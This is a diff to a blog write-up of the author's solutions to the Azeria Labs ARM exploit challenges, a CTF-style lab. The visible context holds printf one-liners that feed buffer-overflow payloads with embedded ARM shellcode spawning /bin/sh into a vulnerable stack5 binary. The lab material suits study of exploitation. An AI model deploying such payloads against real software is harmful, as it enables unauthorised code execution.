@@ -9,6 +9,7 @@ tags:
   - CTF
   - AzeriaLabs
 comments: true
+topic: debugging
 ---
 
 Recently I studied the ARM Exploit tutorial from <https://azeria-labs.com/>. At the end, the author posted a few challenges. Below are my solutions.
@@ -510,5 +511,3 @@ printf '11111111111111111111111111111111111111111111111111111111111111111111\x4c
 printf '11111111111111111111111111111111111111111111111111111111111111111111\xf0\xf1\xff\xbe\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa0\x49\x40\x52\x40\xc2\x71\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x78' | ./stack5
 
 ```
-
-
